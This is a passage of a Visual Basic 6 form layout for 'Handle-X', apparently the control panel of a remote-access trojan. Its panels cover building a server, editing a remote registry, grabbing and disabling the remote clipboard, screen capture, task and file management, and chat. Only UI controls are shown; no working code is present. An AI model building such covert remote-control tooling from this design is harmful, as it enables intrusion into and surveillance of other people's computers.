         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   11
         Left            =   2040
         TabIndex        =   115
         Top             =   1295
         Width           =   1350
      End
      Begin VB.Label Description 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Port Number :-"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   10
         Left            =   2040
         TabIndex        =   114
         Top             =   645
         Width           =   1230
      End
      Begin VB.Label EditServerButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Compose && Save the new Server"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   1
         Left            =   4920
         MouseIcon       =   "frm_main.frx":499CA
         MousePointer    =   99  'Custom
         TabIndex        =   107
         ToolTipText     =   "Get The Remoted System ClipBoard Text"
         Top             =   4200
         Width           =   3015
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Edit Server :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   6
         Left            =   0
         TabIndex        =   106
         Top             =   0
         Width           =   8655
      End
      Begin VB.Label EditServerButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Load Original Handle-X Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00000000&
         Height          =   255
         Index           =   0
         Left            =   840
         MouseIcon       =   "frm_main.frx":49CD4
         MousePointer    =   99  'Custom
         TabIndex        =   105
         ToolTipText     =   "Get The Remoted System ClipBoard Text"
         Top             =   4200
         Width           =   3015
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   4
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   5
      Top             =   2640
      Visible         =   0   'False
      Width           =   375
      Begin MSComctlLib.ImageList RegImageList 
         Left            =   6120
         Tag             =   "FileBrowser ImageList"
         Top             =   2400
         _ExtentX        =   1005
         _ExtentY        =   1005
         BackColor       =   16777215
         ImageWidth      =   12
         ImageHeight     =   12
         UseMaskColor    =   0   'False
         _Version        =   393216
         BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
            NumListImages   =   12
            BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":49FDE
               Key             =   ""
            EndProperty
            BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":4B260
               Key             =   ""
            EndProperty
            BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":4B57A
               Key             =   ""
            EndProperty
            BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":4BE54
               Key             =   ""
            EndProperty
            BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":4BFAE
               Key             =   ""
            EndProperty
            BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":4C2C8
               Key             =   ""
            EndProperty
            BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":4EA7A
               Key             =   ""
            EndProperty
            BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":4F354
               Key             =   ""
            EndProperty
            BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":5002E
               Key             =   ""
            EndProperty
            BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":50908
               Key             =   ""
            EndProperty
            BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":50A62
               Key             =   ""
            EndProperty
            BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
               Picture         =   "frm_main.frx":50DB4
               Key             =   ""
            EndProperty
         EndProperty
      End
      Begin MSComctlLib.ListView RegListView 
         Height          =   4035
         Left            =   3915
         TabIndex        =   101
         Top             =   600
         Width           =   4680
         _ExtentX        =   8255
         _ExtentY        =   7117
         View            =   3
         LabelEdit       =   1
         Sorted          =   -1  'True
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "RegImageList"
         SmallIcons      =   "RegImageList"
         ForeColor       =   0
         BackColor       =   16777215
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   3
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Key             =   "Name"
            Object.Tag             =   "Name"
            Text            =   "Value Name"
            Object.Width           =   3528
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Key             =   "Size"
            Object.Tag             =   "Size"
            Text            =   "Type"
            Object.Width           =   1764
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Key             =   "Read Only"
            Object.Tag             =   "Read Only"
            Text            =   "Data"
            Object.Width           =   2293
         EndProperty
      End
      Begin MSComctlLib.TreeView RegKeysTree 
         Height          =   4035
         Left            =   60
         TabIndex        =   102
         Top             =   600
         Width           =   3855
         _ExtentX        =   6800
         _ExtentY        =   7117
         _Version        =   393217
         HideSelection   =   0   'False
         Indentation     =   18
         LabelEdit       =   1
         LineStyle       =   1
         Style           =   6
         FullRowSelect   =   -1  'True
         SingleSel       =   -1  'True
         ImageList       =   "RegImageList"
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.Label bar 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         BeginProperty Font 
            Name            =   "Small Fonts"
            Size            =   6
            Charset         =   178
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   225
         Index           =   3
         Left            =   0
         TabIndex        =   104
         Top             =   4680
         Width           =   8625
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   5
         Left            =   2520
         Stretch         =   -1  'True
         ToolTipText     =   "Find Value In Sellected Key"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   6
         Left            =   4080
         Stretch         =   -1  'True
         ToolTipText     =   "Creat New Value"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   7
         Left            =   4560
         Stretch         =   -1  'True
         ToolTipText     =   "Rename Value"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   8
         Left            =   5040
         Stretch         =   -1  'True
         ToolTipText     =   "Modify Value"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   9
         Left            =   5520
         Stretch         =   -1  'True
         ToolTipText     =   "Del Value"
         Top             =   300
         Width           =   255
      End
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-Xl\Registry Manager :\>_"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   5
         Left            =   0
         TabIndex        =   103
         Top             =   0
         Width           =   8655
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   0
         Left            =   120
         Stretch         =   -1  'True
         ToolTipText     =   "Read Registry Main Classes"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   1
         Left            =   600
         Stretch         =   -1  'True
         ToolTipText     =   "Explore Key"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   2
         Left            =   1080
         Stretch         =   -1  'True
         ToolTipText     =   "Creat New Key"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   3
         Left            =   1560
         Stretch         =   -1  'True
         ToolTipText     =   "Del Tree Key"
         Top             =   300
         Width           =   255
      End
      Begin VB.Image Reg_Manager_Buttons 
         Appearance      =   0  'Flat
         BorderStyle     =   1  'Fixed Single
         Height          =   255
         Index           =   4
         Left            =   2040
         Stretch         =   -1  'True
         ToolTipText     =   "Find Key"
         Top             =   300
         Width           =   255
      End
   End
   Begin VB.PictureBox BackGround 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   5100
      Left            =   60
      ScaleHeight     =   5023.486
      ScaleMode       =   0  'User
      ScaleWidth      =   1800
      TabIndex        =   13
      Top             =   1130
      Width           =   1830
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BackStyle       =   0  'Transparent
         Caption         =   "X-FireWall "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   10
         Left            =   45
         MouseIcon       =   "frm_main.frx":51106
         MousePointer    =   99  'Custom
         TabIndex        =   61
         Top             =   3155
         Width           =   1755
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         Index           =   2
         X1              =   2000
         X2              =   0
         Y1              =   4755.963
         Y2              =   4755.963
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         Index           =   1
         X1              =   2000
         X2              =   0
         Y1              =   4042.568
         Y2              =   4042.568
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         Index           =   0
         X1              =   2000
         X2              =   0
         Y1              =   2734.679
         Y2              =   2734.679
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Screen Capture"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   8
         Left            =   45
         MouseIcon       =   "frm_main.frx":51410
         MousePointer    =   99  'Custom
         TabIndex        =   29
         Top             =   2463
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Exit"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   15
         Left            =   45
         MouseIcon       =   "frm_main.frx":5171A
         MousePointer    =   99  'Custom
         TabIndex        =   28
         Top             =   4844
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "About Handle-X"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   14
         Left            =   45
         MouseIcon       =   "frm_main.frx":51A24
         MousePointer    =   99  'Custom
         TabIndex        =   27
         Top             =   4501
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Help&&FAQ"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   13
         Left            =   45
         MouseIcon       =   "frm_main.frx":51D2E
         MousePointer    =   99  'Custom
         TabIndex        =   26
         Top             =   4200
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Script Manager"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   12
         Left            =   45
         MouseIcon       =   "frm_main.frx":52038
         MousePointer    =   99  'Custom
         TabIndex        =   24
         Top             =   3815
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Server Editor"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   9
         Left            =   45
         MouseIcon       =   "frm_main.frx":52342
         MousePointer    =   99  'Custom
         TabIndex        =   23
         Top             =   2826
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Configurations"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   11
         Left            =   45
         MouseIcon       =   "frm_main.frx":5264C
         MousePointer    =   99  'Custom
         TabIndex        =   22
         Top             =   3484
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Windows&&Clipboard"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   7
         Left            =   50
         MouseIcon       =   "frm_main.frx":52956
         MousePointer    =   99  'Custom
         TabIndex        =   21
         Top             =   2158
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Internet Manager"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   6
         Left            =   50
         MouseIcon       =   "frm_main.frx":52C60
         MousePointer    =   99  'Custom
         TabIndex        =   20
         Top             =   1854
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Device Manager"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   5
         Left            =   50
         MouseIcon       =   "frm_main.frx":52F6A
         MousePointer    =   99  'Custom
         TabIndex        =   19
         Top             =   1550
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Registry Manager"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   4
         Left            =   50
         MouseIcon       =   "frm_main.frx":53274
         MousePointer    =   99  'Custom
         TabIndex        =   18
         Top             =   1261
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Task Manager"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   3
         Left            =   50
         MouseIcon       =   "frm_main.frx":5357E
         MousePointer    =   99  'Custom
         TabIndex        =   17
         Top             =   957
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "File Browser"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   2
         Left            =   50
         MouseIcon       =   "frm_main.frx":53888
         MousePointer    =   99  'Custom
         TabIndex        =   16
         Top             =   653
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Chat Manager"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   1
         Left            =   50
         MouseIcon       =   "frm_main.frx":53B92
         MousePointer    =   99  'Custom
         TabIndex        =   15
         Top             =   349
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Network Stuff"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   0
         Left            =   45
         MouseIcon       =   "frm_main.frx":53E9C
         MousePointer    =   99  'Custom
         TabIndex        =   14
         Top             =   45
         Width           =   1755
      End
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   12
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   11
      Top             =   5520
      Visible         =   0   'False
      Width           =   375
      Begin VB.Label RoomTitle 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "\Handle-X\Script Manager :\>"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   12
         Left            =   0
         TabIndex        =   182
         Top             =   0
         Width           =   8655
      End
   End
   Begin VB.Timer TheManager 
      Interval        =   1000
      Left            =   360
      Tag             =   "0"
      Top             =   480
   End
   Begin MSWinsockLib.Winsock Socket 
      Index           =   0
      Left            =   1080
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemoteHost      =   "4000"
   End
   Begin VB.PictureBox room 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   375
      Index           =   7
      Left            =   10320
      ScaleHeight     =   345
      ScaleWidth      =   345
      TabIndex        =   8
      Top             =   3720
      Visible         =   0   'False
      Width           =   375
      Begin VB.TextBox WindowsControl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BeginProperty DataFormat 
            Type            =   1
            Format          =   "dd/MM/yyyy"
            HaveTrueFalseNull=   0
            FirstDayOfWeek  =   0
            FirstWeekOfYear =   0
            LCID            =   3073
            SubFormatType   =   3
         EndProperty
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         IMEMode         =   3  'DISABLE
         Index           =   1
         Left            =   360
         TabIndex        =   83
         Top             =   3720
         Width           =   2655
      End
      Begin VB.TextBox WindowsControl 
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   3645
         IMEMode         =   3  'DISABLE
         Index           =   2
         Left            =   3480
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   77
         Top             =   480
         Width           =   4935
      End
      Begin VB.TextBox WindowsControl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00A66539&
         BeginProperty DataFormat 
            Type            =   0
            Format          =   "hh:mm:ss AMPM"
            HaveTrueFalseNull=   0
            FirstDayOfWeek  =   0
            FirstWeekOfYear =   0
            LCID            =   3073
            SubFormatType   =   0
         EndProperty
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   178
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         IMEMode         =   3  'DISABLE
         Index           =   0
         Left            =   360
         TabIndex        =   74
         Top             =   2880
         Width           =   2655
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Enable"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   13
         Left            =   7680
         MouseIcon       =   "frm_main.frx":541A6
         MousePointer    =   99  'Custom
         TabIndex        =   82
         ToolTipText     =   "Enabel ClipBoard (Enable Copy,Cut and Paste)"
         Top             =   4200
         Width           =   735
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Disable"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   12
         Left            =   6840
         MouseIcon       =   "frm_main.frx":544B0
         MousePointer    =   99  'Custom
         TabIndex        =   81
         ToolTipText     =   "Disabel ClipBoard (Disable Copy,Cut and Paste)"
         Top             =   4200
         Width           =   735
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Clear"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   11
         Left            =   6120
         MouseIcon       =   "frm_main.frx":547BA
         MousePointer    =   99  'Custom
         TabIndex        =   80
         ToolTipText     =   "Clear The ClipBoard"
         Top             =   4200
         Width           =   615
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Set Clipboard"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   10
         Left            =   4800
         MouseIcon       =   "frm_main.frx":54AC4
         MousePointer    =   99  'Custom
         TabIndex        =   79
         ToolTipText     =   "Set The Remoted System ClipBoard Text"
         Top             =   4200
         Width           =   1215
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Get Clipboard"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   9
         Left            =   3480
         MouseIcon       =   "frm_main.frx":54DCE
         MousePointer    =   99  'Custom
         TabIndex        =   78
         ToolTipText     =   "Get The Remoted System ClipBoard Text"
         Top             =   4200
         Width           =   1215
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Set Date"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   8
         Left            =   1800
         MouseIcon       =   "frm_main.frx":550D8
         MousePointer    =   99  'Custom
         TabIndex        =   76
         ToolTipText     =   "Set Remoted System  Date"
         Top             =   4080
         Width           =   1215
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Get Date"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   7
         Left            =   360
         MouseIcon       =   "frm_main.frx":553E2
         MousePointer    =   99  'Custom
         TabIndex        =   75
         ToolTipText     =   "Get Remoted System Date"
         Top             =   4080
         Width           =   1215
      End
      Begin VB.Label SystemButtons 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Set Time"
         BeginProperty Font 
